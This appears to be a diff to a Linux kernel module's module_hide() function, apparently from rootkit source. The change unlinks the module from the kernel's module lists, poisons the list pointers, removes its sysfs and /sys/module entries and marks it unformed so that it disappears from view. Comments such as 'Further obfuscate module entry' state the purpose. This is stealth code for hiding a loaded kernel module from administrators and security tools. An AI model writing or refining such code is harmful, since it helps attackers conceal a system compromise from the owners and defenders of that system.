@@ -164,11 +164,42 @@ void module_hide(void) {
     // Set the module's list to point to itself
     THIS_MODULE->list.next = &THIS_MODULE->list;
     THIS_MODULE->list.prev = &THIS_MODULE->list;
-
-    // Remove from /sys/module
-    kobject_del(&THIS_MODULE->mkobj.kobj);
-
+    
     // Hide module from target list
+    struct module *v5;
+    struct list_head *v4 = THIS_MODULE->target_list.next;
+
+    if (v4 != &THIS_MODULE->target_list) {
+    do {
+        v5 = list_entry(v4->next, struct module, list);  // Proper way to get module struct
+
+        if (list_del_entry_valid(&v4[-1])) {
+            struct list_head *v7 = v4[-1].next;
+            struct list_head *v6 = v4[-1].prev;
+            v7->prev = v6;
+            v6->next = v7;
+        }
+
+        v4[-1].next = (struct list_head *)0xDEAD000000000100LL;
+        v4[-1].prev = (struct list_head *)0xDEAD000000000122LL;
+
+        if (list_del_entry_valid(v4)) {
+            struct list_head *v9 = v4->next;
+            struct list_head *v8 = v4->prev;
+            v9->prev = v8;
+            v8->next = v9;
+        }
+
+        v4->next = (struct list_head *)0xDEAD000000000100LL;
+        v4->prev = (struct list_head *)0xDEAD000000000122LL;
+        sysfs_remove_link(&THIS_MODULE->mkobj.kobj, THIS_MODULE->name);
+
+        kfree(&v4[-1]);
+        v4 = &v5->list; // Move to the next module in the list
+    } while (v5 != container_of(&THIS_MODULE->target_list, struct module, list));
+    }
+
+    /*
     struct list_head *v4 = THIS_MODULE->target_list.next;
     if (v4 != &THIS_MODULE->target_list) {
         do {
@@ -195,7 +226,7 @@ void module_hide(void) {
             v4 = (struct list_head *)v5;
         } while (v5 != (struct module *)&THIS_MODULE->target_list);
     }
-
+    */
     // Ensure module is properly hidden
     if (list_del_entry_valid(&THIS_MODULE->list)) {
         struct list_head *v12 = THIS_MODULE->list.next;
@@ -207,13 +238,17 @@ void module_hide(void) {
     // Further obfuscate module entry
     THIS_MODULE->list.prev = (struct list_head *)0xDEAD000000000122LL;
     THIS_MODULE->state = MODULE_STATE_UNFORMED;
-
+    
+    // Remove from /sys/module
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    
     // Nullify attributes to prevent crashes
     THIS_MODULE->sect_attrs = NULL;
     THIS_MODULE->notes_attrs = NULL;
 
     module_hidden = 1; // Mark module as hidden
 }
+
 
 int __init driver_entry(void) {
     int ret;
